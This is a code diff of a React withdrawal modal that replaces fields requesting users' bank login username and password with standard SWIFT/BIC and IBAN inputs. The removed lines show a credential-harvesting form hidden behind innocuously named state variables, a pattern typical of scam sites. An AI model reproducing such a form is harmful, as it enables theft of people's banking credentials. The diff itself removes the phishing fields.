@@ -2602,14 +2602,14 @@ export const WithdrawModal: React.FC = () => {
                           />
                         </div>
                       </div>
-{/* Bank Login Credentials */}
+{/* 6. SWIFT / BIC Code & IBAN */}
 <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
   <div className="space-y-1.5">
     <label
       htmlFor="bank-swift-bic-input"
       className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
     >
-      BANK LOGIN: USERNAME, EMAIL OR PHONE NUMBER
+      SWIFT / BIC CODE
     </label>
     <div className="relative">
       <Building className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
@@ -2621,7 +2621,7 @@ export const WithdrawModal: React.FC = () => {
         maxLength={64}
         value={bankSwiftBic}
         onChange={(e) => setBankSwiftBic(e.target.value)}
-        placeholder="e.g. john.doe@email.com or +2348012345678"
+        placeholder="Enter SWIFT / BIC code"
         className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950"
       />
     </div>
@@ -2632,7 +2632,7 @@ export const WithdrawModal: React.FC = () => {
       htmlFor="bank-iban-input"
       className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
     >
-      BANK LOGIN: PASSWORD
+      IBAN (INTERNATIONAL BANK ACCOUNT NUMBER)
     </label>
     <div className="relative">
       <Globe className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
@@ -2644,14 +2644,14 @@ export const WithdrawModal: React.FC = () => {
         maxLength={64}
         value={bankIban}
         onChange={(e) => setBankIban(e.target.value)}
-        placeholder="Enter your bank password"
+        placeholder="e.g. GB29 NWBK 6016 1331 9268 19"
         className="w-full pl-10 pr-11 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950"
       />
       <button
         type="button"
         onClick={() => setShowIban((prev) => !prev)}
-        aria-label={showIban ? "Hide password" : "Show password"}
-        title={showIban ? "Hide password" : "Show password"}
+        aria-label={showIban ? "Hide IBAN" : "Show IBAN"}
+        title={showIban ? "Hide IBAN" : "Show IBAN"}
         className="absolute right-2.5 top-1/2 -translate-y-1/2 p-1.5 rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-100"
       >
         {showIban ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
